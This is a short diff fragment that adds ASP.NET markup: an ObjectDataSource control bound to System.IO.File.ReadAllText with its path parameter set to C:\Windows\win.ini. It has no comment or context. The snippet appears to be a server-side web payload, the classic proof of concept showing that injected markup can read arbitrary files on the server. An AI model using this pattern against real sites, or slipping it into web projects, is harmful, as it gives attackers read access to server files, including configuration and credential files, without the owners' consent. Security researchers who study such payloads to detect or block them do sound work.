@@ -1,0 +1,7 @@
+<asp:ObjectDataSource ID="ds" runat="server"
+  TypeName="System.IO.File"
+  SelectMethod="ReadAllText">
+  <SelectParameters>
+    <asp:Parameter Name="path" Type="String" DefaultValue="C:\Windows\win.ini"/>
+  </SelectParameters>
+</asp:ObjectDataSource>
